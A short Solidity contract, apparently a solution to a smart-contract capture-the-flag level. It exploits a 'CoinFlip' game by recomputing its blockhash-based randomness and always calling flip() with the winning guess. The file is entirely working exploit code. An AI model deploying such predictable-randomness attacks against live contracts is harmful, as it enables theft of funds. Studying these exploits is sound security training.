// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

abstract contract CoinFlip {
    function flip(bool _guess) public virtual returns (bool);
}

contract Attacker {
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {}

    function attack(address target) public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        CoinFlip(target).flip(side);
    }
}
